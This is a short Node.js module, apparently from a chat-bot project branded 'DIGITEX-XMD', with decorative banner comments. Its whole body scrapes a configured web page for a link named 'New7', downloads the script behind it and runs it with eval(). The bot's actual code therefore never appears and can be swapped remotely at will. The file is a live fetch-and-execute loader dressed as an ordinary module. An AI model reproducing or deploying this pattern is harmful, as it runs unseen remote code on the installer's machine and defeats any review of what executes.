//  [DIGITEX-XMD EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Juma wycliffe                                    
//  >> Version: 8.3.5-digitex.7

const axios = require('axios');
const cheerio = require('cheerio');
const juma = require(__dirname + "/../config");

async function fetchNew7Url() {
  try {
    const response = await axios.get(juma.DIGITEX_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("New7")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('New not found 😭');
    }

    console.log('New loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNew7Url();
